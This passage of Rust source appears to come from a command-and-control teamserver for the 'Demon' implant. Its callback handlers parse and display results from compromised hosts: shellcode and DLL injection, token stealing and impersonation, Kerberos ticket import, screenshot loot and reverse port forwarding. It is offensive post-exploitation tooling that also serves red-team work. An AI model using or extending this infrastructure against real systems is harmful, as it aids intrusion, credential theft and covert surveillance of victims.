        let ppid = parser.read_u32("process ppid")?;
        let session = parser.read_u32("process session")?;
        let threads = parser.read_u32("process threads")?;
        let user = parser.read_utf16("process user")?;
        let arch = if is_wow == 0 { "x64" } else { "x86" };
        rows.push(ProcessRow { name, pid, ppid, session, arch: arch.to_owned(), threads, user });
    }

    let output = format_process_table(&rows);
    if output.is_empty() {
        return Ok(None);
    }

    let mut extra = BTreeMap::new();
    extra.insert("ProcessListRows".to_owned(), process_rows_json(&rows));

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        u32::from(DemonCommand::CommandProcList),
        request_id,
        "Info",
        "Process List:",
        extra,
        output,
    )?);
    Ok(None)
}

async fn handle_process_command_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandProc));
    let subcommand = parser.read_u32("process subcommand")?;

    match DemonProcessCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandProc),
            message: error.to_string(),
        }
    })? {
        DemonProcessCommand::Create => {
            let path = parser.read_utf16("process path")?;
            let pid = parser.read_u32("process pid")?;
            let success = parser.read_u32("process create success")?;
            let piped = parser.read_u32("process create piped")?;
            let verbose = parser.read_u32("process create verbose")?;

            if verbose != 0 {
                let (kind, message) = if success != 0 {
                    ("Info", format!("Process started: Path:[{path}] ProcessID:[{pid}]"))
                } else {
                    ("Error", format!("Process could not be started: Path:[{path}]"))
                };
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandProc),
                    request_id,
                    kind,
                    &message,
                    None,
                )?);
            } else if success == 0 || piped == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandProc),
                    request_id,
                    "Info",
                    "Process create completed",
                    None,
                )?);
            }
        }
        DemonProcessCommand::Kill => {
            let success = parser.read_u32("process kill success")?;
            let pid = parser.read_u32("process kill pid")?;
            let (kind, message) = if success != 0 {
                ("Good", format!("Successfully killed process: {pid}"))
            } else {
                ("Error", "Failed to kill process".to_owned())
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandProc),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        DemonProcessCommand::Modules => {
            let pid = parser.read_u32("proc modules pid")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                let name = parser.read_string("module name")?;
                let base = parser.read_u64("module base address")?;
                rows.push(ModuleRow { name, base });
            }

            let output = format_module_table(&rows);
            let mut extra = BTreeMap::new();
            extra.insert(
                "ModuleRows".to_owned(),
                Value::Array(
                    rows.iter()
                        .map(|r| {
                            json!({
                                "Name": r.name,
                                "Base": format!("0x{:016X}", r.base),
                            })
                        })
                        .collect(),
                ),
            );

            events.broadcast(agent_response_event_with_extra(
                agent_id,
                u32::from(DemonCommand::CommandProc),
                request_id,
                "Info",
                &format!("Process Modules (PID: {pid}):"),
                extra,
                output,
            )?);
        }
        DemonProcessCommand::Grep => {
            let mut rows = Vec::new();
            while !parser.is_empty() {
                let name = parser.read_utf16("proc grep name")?;
                let pid = parser.read_u32("proc grep pid")?;
                let ppid = parser.read_u32("proc grep ppid")?;
                let user_raw = parser.read_bytes("proc grep user")?;
                let user = String::from_utf8_lossy(&user_raw).trim_end_matches('\0').to_owned();
                let arch_val = parser.read_u32("proc grep arch")?;
                let arch = if arch_val == 86 { "x86" } else { "x64" };
                rows.push(GrepRow { name, pid, ppid, user, arch: arch.to_owned() });
            }

            let output = format_grep_table(&rows);
            let mut extra = BTreeMap::new();
            extra.insert(
                "GrepRows".to_owned(),
                Value::Array(
                    rows.iter()
                        .map(|r| {
                            json!({
                                "Name": r.name,
                                "PID": r.pid,
                                "PPID": r.ppid,
                                "User": r.user,
                                "Arch": r.arch,
                            })
                        })
                        .collect(),
                ),
            );

            events.broadcast(agent_response_event_with_extra(
                agent_id,
                u32::from(DemonCommand::CommandProc),
                request_id,
                "Info",
                "Process Grep:",
                extra,
                output,
            )?);
        }
        DemonProcessCommand::Memory => {
            let pid = parser.read_u32("proc memory pid")?;
            let query_protect = parser.read_u32("proc memory query protect")?;
            let mut rows = Vec::new();
            while !parser.is_empty() {
                let base = parser.read_u64("memory region base")?;
                let size = parser.read_u32("memory region size")?;
                let protect = parser.read_u32("memory region protect")?;
                let state = parser.read_u32("memory region state")?;
                let mem_type = parser.read_u32("memory region type")?;
                rows.push(MemoryRow { base, size, protect, state, mem_type });
            }

            let output = format_memory_table(&rows);
            let mut extra = BTreeMap::new();
            extra.insert(
                "MemoryRows".to_owned(),
                Value::Array(
                    rows.iter()
                        .map(|r| {
                            json!({
                                "Base": format!("0x{:016X}", r.base),
                                "Size": format!("0x{:X}", r.size),
                                "Protect": format_memory_protect(r.protect),
                                "State": format_memory_state(r.state),
                                "Type": format_memory_type(r.mem_type),
                            })
                        })
                        .collect(),
                ),
            );

            events.broadcast(agent_response_event_with_extra(
                agent_id,
                u32::from(DemonCommand::CommandProc),
                request_id,
                "Info",
                &format!(
                    "Process Memory (PID: {pid}, Filter: {}):",
                    if query_protect == 0 {
                        "All".to_owned()
                    } else {
                        format_memory_protect(query_protect)
                    }
                ),
                extra,
                output,
            )?);
        }
    }

    Ok(None)
}

async fn handle_inject_shellcode_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandInjectShellcode));
    let status = parser.read_u32("shellcode inject status")?;
    let (kind, message) = match status {
        x if x == u32::from(DemonInjectError::Success) => {
            ("Good", "Successfully injected shellcode")
        }
        x if x == u32::from(DemonInjectError::Failed) => ("Error", "Failed to inject shellcode"),
        x if x == u32::from(DemonInjectError::InvalidParam) => {
            ("Error", "Invalid parameter specified")
        }
        x if x == u32::from(DemonInjectError::ProcessArchMismatch) => {
            ("Error", "Process architecture mismatch")
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandInjectShellcode),
                message: format!("unknown shellcode injection status {other}"),
            });
        }
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandInjectShellcode),
        request_id,
        kind,
        message,
        None,
    )?);
    Ok(None)
}

async fn handle_inject_dll_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let cmd = u32::from(DemonCommand::CommandInjectDll);
    let mut parser = CallbackParser::new(payload, cmd);
    let status = parser.read_u32("dll inject status")?;
    let (kind, message) = match status {
        x if x == u32::from(DemonInjectError::Success) => {
            ("Good", "Successfully injected DLL into remote process")
        }
        x if x == u32::from(DemonInjectError::Failed) => {
            ("Error", "Failed to inject DLL into remote process")
        }
        x if x == u32::from(DemonInjectError::InvalidParam) => {
            ("Error", "DLL injection failed: invalid parameter")
        }
        x if x == u32::from(DemonInjectError::ProcessArchMismatch) => {
            ("Error", "DLL injection failed: process architecture mismatch")
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: cmd,
                message: format!("unknown DLL injection status {other}"),
            });
        }
    };

    events.broadcast(agent_response_event(agent_id, cmd, request_id, kind, message, None)?);
    Ok(None)
}

async fn handle_spawn_dll_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let cmd = u32::from(DemonCommand::CommandSpawnDll);
    let mut parser = CallbackParser::new(payload, cmd);
    let status = parser.read_u32("spawn dll status")?;
    let (kind, message) = match status {
        x if x == u32::from(DemonInjectError::Success) => {
            ("Good", "Successfully spawned DLL in new process")
        }
        x if x == u32::from(DemonInjectError::Failed) => {
            ("Error", "Failed to spawn DLL in new process")
        }
        x if x == u32::from(DemonInjectError::InvalidParam) => {
            ("Error", "DLL spawn failed: invalid parameter")
        }
        x if x == u32::from(DemonInjectError::ProcessArchMismatch) => {
            ("Error", "DLL spawn failed: process architecture mismatch")
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: cmd,
                message: format!("unknown DLL spawn status {other}"),
            });
        }
    };

    events.broadcast(agent_response_event(agent_id, cmd, request_id, kind, message, None)?);
    Ok(None)
}

async fn handle_token_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandToken));
    let subcommand = parser.read_u32("token subcommand")?;
    let cmd = u32::from(DemonCommand::CommandToken);

    match DemonTokenCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload { command_id: cmd, message: error.to_string() }
    })? {
        DemonTokenCommand::Impersonate => {
            let success = parser.read_u32("token impersonation success")?;
            let user = parser.read_string("token impersonation user")?;
            let (kind, message) = if success != 0 {
                ("Good", format!("Successfully impersonated {user}"))
            } else {
                ("Error", format!("Failed to impersonate {user}"))
            };
            events
                .broadcast(agent_response_event(agent_id, cmd, request_id, kind, &message, None)?);
        }

        DemonTokenCommand::Steal => {
            let user = parser.read_utf16("token steal user")?;
            let token_id = parser.read_u32("token steal token id")?;
            let target_pid = parser.read_u32("token steal target pid")?;
            events.broadcast(agent_response_event(
                agent_id,
                cmd,
                request_id,
                "Good",
                &format!(
                    "Successfully stole and impersonated token from {target_pid} User:[{user}] TokenID:[{token_id}]"
                ),
                None,
            )?);
        }

        DemonTokenCommand::List => {
            let output = format_token_list(&mut parser)?;
            let message = "Token Vault:";
            events.broadcast(agent_response_event(
                agent_id,
                cmd,
                request_id,
                "Info",
                message,
                Some(output),
            )?);
        }

        DemonTokenCommand::PrivsGetOrList => {
            let priv_list = parser.read_u32("token privs list flag")?;
            if priv_list != 0 {
                let output = format_token_privs_list(&mut parser)?;
                events.broadcast(agent_response_event(
                    agent_id,
                    cmd,
                    request_id,
                    "Good",
                    "List Privileges for current Token:",
                    Some(output),
                )?);
            } else {
                let success = parser.read_u32("token privs get success")?;
                let priv_name = parser.read_string("token privs get name")?;
                let (kind, message) = if success != 0 {
                    ("Good", format!("The privilege {priv_name} was successfully enabled"))
                } else {
                    ("Error", format!("Failed to enable the {priv_name} privilege"))
                };
                events.broadcast(agent_response_event(
                    agent_id, cmd, request_id, kind, &message, None,
                )?);
            }
        }

        DemonTokenCommand::Make => {
            if parser.is_empty() {
                events.broadcast(agent_response_event(
                    agent_id,
                    cmd,
                    request_id,
                    "Error",
                    "Failed to create token",
                    None,
                )?);
            } else {
                let user_domain = parser.read_utf16("token make user domain")?;
                events.broadcast(agent_response_event(
                    agent_id,
                    cmd,
                    request_id,
                    "Good",
                    &format!("Successfully created and impersonated token: {user_domain}"),
                    None,
                )?);
            }
        }

        DemonTokenCommand::GetUid => {
            let elevated = parser.read_u32("token getuid elevated")?;
            let user = parser.read_utf16("token getuid user")?;
            let message = if elevated != 0 {
                format!("Token User: {user} (Admin)")
            } else {
                format!("Token User: {user}")
            };
            events.broadcast(agent_response_event(
                agent_id, cmd, request_id, "Good", &message, None,
            )?);
        }

        DemonTokenCommand::Revert => {
            let success = parser.read_u32("token revert success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successful reverted token to itself")
            } else {
                ("Error", "Failed to revert token to itself")
            };
            events.broadcast(agent_response_event(agent_id, cmd, request_id, kind, message, None)?);
        }

        DemonTokenCommand::Remove => {
            let success = parser.read_u32("token remove success")?;
            let token_id = parser.read_u32("token remove id")?;
            let (kind, message) = if success != 0 {
                ("Good", format!("Successful removed token [{token_id}] from vault"))
            } else {
                ("Error", format!("Failed to remove token [{token_id}] from vault"))
            };
            events
                .broadcast(agent_response_event(agent_id, cmd, request_id, kind, &message, None)?);
        }

        DemonTokenCommand::Clear => {
            events.broadcast(agent_response_event(
                agent_id,
                cmd,
                request_id,
                "Good",
                "Token vault has been cleared",
                None,
            )?);
        }

        DemonTokenCommand::FindTokens => {
            let success = parser.read_u32("token find success")?;
            if success == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    cmd,
                    request_id,
                    "Error",
                    "Failed to list existing tokens",
                    None,
                )?);
            } else {
                let output = format_found_tokens(&mut parser)?;
                events.broadcast(agent_response_event(
                    agent_id,
                    cmd,
                    request_id,
                    "Info",
                    "Tokens available:",
                    Some(output),
                )?);
            }
        }
    }

    Ok(None)
}

fn format_token_list(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    struct TokenEntry {
        index: u32,
        handle: u32,
        domain_user: String,
        process_id: u32,
        token_type: u32,
        impersonating: u32,
    }

    let mut entries = Vec::new();
    while !parser.is_empty() {
        let index = parser.read_u32("token list index")?;
        let handle = parser.read_u32("token list handle")?;
        let domain_user = parser.read_utf16("token list domain user")?;
        let process_id = parser.read_u32("token list process id")?;
        let token_type = parser.read_u32("token list type")?;
        let impersonating = parser.read_u32("token list impersonating")?;
        entries.push(TokenEntry {
            index,
            handle,
            domain_user,
            process_id,
            token_type,
            impersonating,
        });
    }

    if entries.is_empty() {
        return Ok("\nThe token vault is empty".to_owned());
    }

    let max_user = entries.iter().map(|e| e.domain_user.len()).max().unwrap_or(11).max(11);

    let mut output = format!(
        "\n {:<4}  {:<6}  {:<width$}  {:<4}  {:<14} {:<4}\n",
        " ID ",
        "Handle",
        "Domain\\User",
        "PID",
        "Type",
        "Impersonating",
        width = max_user
    );
    output.push_str(&format!(
        " {:<4}  {:<6}  {:<width$}  {:<4}  {:<14} {:<4}\n",
        "----",
        "------",
        "-----------",
        "---",
        "--------------",
        "-------------",
        width = max_user
    ));

    for entry in &entries {
        let type_str = match entry.token_type {
            1 => "stolen",
            2 => "make (local)",
            3 => "make (network)",
            _ => "unknown",
        };
        let imp_str = if entry.impersonating != 0 { "Yes" } else { "No" };
        output.push_str(&format!(
            " {:<4}  0x{:<4x}  {:<width$}  {:<4}  {:<14} {:<4}\n",
            entry.index,
            entry.handle,
            entry.domain_user,
            entry.process_id,
            type_str,
            imp_str,
            width = max_user
        ));
    }

    Ok(output)
}

fn format_token_privs_list(
    parser: &mut CallbackParser<'_>,
) -> Result<String, CommandDispatchError> {
    let mut output = String::from("\n");
    while !parser.is_empty() {
        let privilege = parser.read_string("token privilege name")?;
        let state = parser.read_u32("token privilege state")?;
        let state_str = match state {
            3 => "Enabled",
            2 => "Adjusted",
            0 => "Disabled",
            _ => "Unknown",
        };
        output.push_str(&format!(" {privilege} :: {state_str}\n"));
    }
    Ok(output)
}

fn format_found_tokens(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    const SECURITY_MANDATORY_LOW_RID: u32 = 0x0000_1000;
    const SECURITY_MANDATORY_MEDIUM_RID: u32 = 0x0000_2000;
    const SECURITY_MANDATORY_HIGH_RID: u32 = 0x0000_3000;
    const SECURITY_MANDATORY_SYSTEM_RID: u32 = 0x0000_4000;

    struct FoundToken {
        domain_user: String,
        integrity: String,
        token_type: String,
        impersonation: String,
        remote_auth: String,
        process_id: u32,
        handle: u32,
    }

    let num_tokens = parser.read_u32("token find count")?;
    if num_tokens == 0 {
        return Ok("\nNo tokens found".to_owned());
    }

    let mut tokens = Vec::new();
    for _ in 0..num_tokens {
        if parser.is_empty() {
            break;
        }
        let domain_user = parser.read_utf16("found token user")?;
        let process_id = parser.read_u32("found token pid")?;
        let handle = parser.read_u32("found token handle")?;
        let integrity_level = parser.read_u32("found token integrity")?;
        let impersonation_level = parser.read_u32("found token impersonation")?;
        let token_type_raw = parser.read_u32("found token type")?;

        let integrity = if integrity_level <= SECURITY_MANDATORY_LOW_RID {
            "Low"
        } else if (SECURITY_MANDATORY_MEDIUM_RID..SECURITY_MANDATORY_HIGH_RID)
            .contains(&integrity_level)
        {
            "Medium"
        } else if (SECURITY_MANDATORY_HIGH_RID..SECURITY_MANDATORY_SYSTEM_RID)
            .contains(&integrity_level)
        {
            "High"
        } else if integrity_level >= SECURITY_MANDATORY_SYSTEM_RID {
            "System"
        } else {
            "Low"
        };

        let (token_type, impersonation, remote_auth) = if token_type_raw == 2 {
            let imp = match impersonation_level {
                0 => "Anonymous",
                1 => "Identification",
                2 => "Impersonation",
                3 => "Delegation",
                _ => "Unknown",
            };
            let remote = if impersonation_level == 3 { "Yes" } else { "No" };
            ("Impersonation", imp, remote)
        } else if token_type_raw == 1 {
            ("Primary", "N/A", "Yes")
        } else {
            ("?", "Unknown", "No")
        };

        tokens.push(FoundToken {
            domain_user,
            integrity: integrity.to_owned(),
            token_type: token_type.to_owned(),
            impersonation: impersonation.to_owned(),
            remote_auth: remote_auth.to_owned(),
            process_id,
            handle,
        });
    }

    if tokens.is_empty() {
        return Ok("\nNo tokens found".to_owned());
    }

    let max_user = tokens.iter().map(|t| t.domain_user.len()).max().unwrap_or(13).max(13);

    let mut output = format!(
        "\n {:<width$}  {:<9}  {:<13}  {:<16}  {:<9} {:<10} {:<9} {:<9}\n",
        " Domain\\User",
        "Integrity",
        "TokenType",
        "Impersonation LV",
        "LocalAuth",
        "RemoteAuth",
        "ProcessID",
        "Handle",
        width = max_user,
    );
    output.push_str(&format!(
        " {:<width$}  {:<9}  {:<13}  {:<16}  {:<9} {:<10} {:<9} {:<9}\n",
        "-".repeat(max_user),
        "---------",
        "-------------",
        "----------------",
        "---------",
        "----------",
        "---------",
        "------",
        width = max_user,
    ));

    for token in &tokens {
        let handle_str =
            if token.handle == 0 { String::new() } else { format!("{:x}", token.handle) };
        output.push_str(&format!(
            " {:<width$}  {:<9}  {:<13}  {:<16}  {:<9} {:<10} {:<9} {:<9}\n",
            token.domain_user,
            token.integrity,
            token.token_type,
            token.impersonation,
            "Yes",
            token.remote_auth,
            token.process_id,
            handle_str,
            width = max_user,
        ));
    }

    output.push_str("\nTo impersonate a user, run: token steal [process id] (handle)");
    Ok(output)
}

async fn handle_screenshot_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
    let success = parser.read_u32("screenshot success")?;
    let context = loot_context(registry, agent_id, request_id).await;

    if success == 0 {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let bytes = parser.read_bytes("screenshot bytes")?;
    if bytes.is_empty() {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let timestamp = OffsetDateTime::now_utc();
    let captured_at = timestamp.format(&Rfc3339)?;
    let name = timestamp
        .format(
            &time::format_description::parse(
                "Desktop_[day].[month].[year]-[hour].[minute].[second].png",
            )
            .map_err(|error| CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                message: error.to_string(),
            })?,
        )
        .map_err(CommandDispatchError::Timestamp)?;

    let record = insert_loot_record(
        database,
        LootRecord {
            id: None,
            agent_id,
            kind: "screenshot".to_owned(),
            name: name.clone(),
            file_path: None,
            size_bytes: Some(i64::try_from(bytes.len()).unwrap_or_default()),
            captured_at: captured_at.clone(),
            data: Some(bytes.clone()),
            metadata: Some(metadata_with_context(
                [
                    ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ("captured_at".to_owned(), Value::String(captured_at.clone())),
                ]
                .into_iter(),
                &context,
            )),
        },
    )
    .await?;

    events.broadcast(loot_new_event(
        &record,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        &context,
    )?);

    if let Some(plugins) = plugins
        && let Err(error) = plugins.emit_loot_captured(&record).await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
    }

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        "Good",
        "Successful took screenshot",
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("screenshot".to_owned())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&bytes))),
            ("MiscData2".to_owned(), Value::String(name)),
        ]),
        String::new(),
    )?);
    Ok(None)
}

async fn handle_kerberos_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandKerberos));
    let subcommand = parser.read_u32("kerberos subcommand")?;

    match DemonKerberosCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandKerberos),
            message: error.to_string(),
        }
    })? {
        DemonKerberosCommand::Luid => {
            let success = parser.read_u32("kerberos luid success")?;
            if success == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandKerberos),
                    request_id,
                    "Error",
                    "Failed to obtain the current logon ID",
                    None,
                )?);
                return Ok(None);
            }

            let high = parser.read_u32("kerberos luid high part")?;
            let low = parser.read_u32("kerberos luid low part")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                "Good",
                &format!("Current LogonId: {high:x}:0x{low:x}"),
                None,
            )?);
        }
        DemonKerberosCommand::Klist => {
            let success = parser.read_u32("kerberos klist success")?;
            if success == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandKerberos),
                    request_id,
                    "Error",
                    "Failed to list all kerberos tickets",
                    None,
                )?);
                return Ok(None);
            }

            let output = format_kerberos_klist(&mut parser)?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                "Info",
                "Kerberos tickets:",
                Some(output),
            )?);
        }
        DemonKerberosCommand::Purge => {
            let success = parser.read_u32("kerberos purge success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successfully purged the Kerberos ticket")
            } else {
                ("Error", "Failed to purge the kerberos ticket")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                kind,
                message,
                None,
            )?);
        }
        DemonKerberosCommand::Ptt => {
            let success = parser.read_u32("kerberos ptt success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successfully imported the Kerberos ticket")
            } else {
                ("Error", "Failed to import the kerberos ticket")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                kind,
                message,
                None,
            )?);
        }
    }

    Ok(None)
}

async fn handle_socket_callback(
    events: &EventBus,
    sockets: &SocketRelayManager,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandSocket));
    let subcommand = parser.read_u32("socket subcommand")?;

    match DemonSocketCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandSocket),
            message: error.to_string(),
        }
    })? {
        DemonSocketCommand::ReversePortForwardAdd => {
            let success = parser.read_u32("rportfwd add success")?;
            let socket_id = parser.read_u32("rportfwd add socket id")?;
            let local_addr = int_to_ipv4(parser.read_u32("rportfwd add local addr")?);
            let local_port = parser.read_u32("rportfwd add local port")?;
            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd add forward addr")?);
            let forward_port = parser.read_u32("rportfwd add forward port")?;
            let (kind, message) = if success != 0 {
                (
                    "Info",
                    format!(
                        "Started reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port} [Id: {socket_id:x}]"
                    ),
                )
            } else {
                (
                    "Error",
                    format!(
                        "Failed to start reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port}"
                    ),
                )
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        DemonSocketCommand::ReversePortForwardList => {
            let output = format_rportfwd_list(&mut parser)?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                "Info",
                "reverse port forwards:",
                Some(output),
            )?);
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = parser.read_u32("rportfwd remove socket id")?;
            let socket_type = parser.read_u32("rportfwd remove type")?;
            let local_addr = int_to_ipv4(parser.read_u32("rportfwd remove local addr")?);
            let local_port = parser.read_u32("rportfwd remove local port")?;
            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd remove forward addr")?);
            let forward_port = parser.read_u32("rportfwd remove forward port")?;
            if socket_type == u32::from(DemonSocketType::ReversePortForward) {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Info",
                    &format!(
                        "Successful closed and removed rportfwd [SocketID: {socket_id:x}] [Forward: {local_addr}:{local_port} -> {forward_addr}:{forward_port}]"
                    ),
                    None,
                )?);
            }
        }
        DemonSocketCommand::ReversePortForwardClear => {
            let success = parser.read_u32("rportfwd clear success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successful closed and removed all rportfwds")
            } else {
                ("Error", "Failed to closed and remove all rportfwds")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                kind,
                message,
                None,
            )?);
        }
        DemonSocketCommand::Read => {
            let socket_id = parser.read_u32("socket read socket id")?;
            let socket_type = parser.read_u32("socket read type")?;
            let success = parser.read_u32("socket read success")?;
            if success == 0 {
                let error_code = parser.read_u32("socket read error code")?;
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Error",
                    &format!("Failed to read from socks target {socket_id}: {error_code}"),
                    None,
                )?);
                return Ok(None);
            }

            let data = parser.read_bytes("socket read data")?;
            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
                if let Err(error) = sockets.write_client_data(agent_id, socket_id, &data).await {
                    warn!(
                        agent_id = format_args!("{agent_id:08X}"),
                        socket_id = format_args!("{socket_id:08X}"),
                        %error,
                        "failed to deliver reverse proxy data to SOCKS client"
                    );
                    events.broadcast(agent_response_event(
                        agent_id,
                        u32::from(DemonCommand::CommandSocket),
                        request_id,
                        "Error",
                        &format!("Failed to deliver socks data for {socket_id}: {error}"),
                        None,
                    )?);
                }
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = parser.read_u32("socket write socket id")?;
            let _socket_type = parser.read_u32("socket write type")?;
            let success = parser.read_u32("socket write success")?;
            if success == 0 {
                let error_code = parser.read_u32("socket write error code")?;
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Error",
                    &format!("Failed to write to socks target {socket_id}: {error_code}"),
                    None,
                )?);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = parser.read_u32("socket close socket id")?;
            let socket_type = parser.read_u32("socket close type")?;
            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
                let _ = sockets.close_client(agent_id, socket_id).await;
            }
        }
        DemonSocketCommand::Connect => {
            let success = parser.read_u32("socket connect success")?;
            let socket_id = parser.read_u32("socket connect socket id")?;
            let error_code = parser.read_u32("socket connect error code")?;
            let _ = sockets.finish_connect(agent_id, socket_id, success != 0, error_code).await;
        }
        DemonSocketCommand::SocksProxyAdd
        | DemonSocketCommand::Open
        | DemonSocketCommand::SocksProxyList
        | DemonSocketCommand::SocksProxyRemove
        | DemonSocketCommand::SocksProxyClear
        | DemonSocketCommand::ReversePortForwardAddLocal => {}
    }

    Ok(None)
}

fn agent_response_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    output: Option<String>,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra_and_context(
        agent_id,
        command_id,
        request_id,
        kind,
        message,
        BTreeMap::new(),
        output.unwrap_or_default(),
        None,
    )
}

fn agent_response_event_with_extra(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    mut extra: BTreeMap<String, Value>,
    output: String,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra_and_context(
        agent_id,
        command_id,
        request_id,
        kind,
        message,
        std::mem::take(&mut extra),
        output,
        None,
    )
}

fn agent_response_event_with_extra_and_context(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    extra: BTreeMap<String, Value>,
    output: String,
    context: Option<&LootContext>,
) -> Result<OperatorMessage, CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let context = context.cloned().unwrap_or_default();
    let extra = agent_response_extra(extra, request_id, kind, message, &context);

    Ok(OperatorMessage::AgentResponse(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp,
            one_time: String::new(),
        },
        info: AgentResponseInfo {
            demon_id: format!("{agent_id:08X}"),
            command_id: command_id.to_string(),
            output,
            command_line: non_empty_option(&context.command_line),
            extra,
        },
    }))
}

fn agent_response_extra(
    mut extra: BTreeMap<String, Value>,
    request_id: u32,
    kind: &str,
    message: &str,
    context: &LootContext,
) -> BTreeMap<String, Value> {
    extra.insert("Type".to_owned(), Value::String(kind.to_owned()));
    extra.insert("Message".to_owned(), Value::String(message.to_owned()));
    extra.insert("RequestID".to_owned(), Value::String(format!("{request_id:X}")));
    if !context.operator.is_empty() {
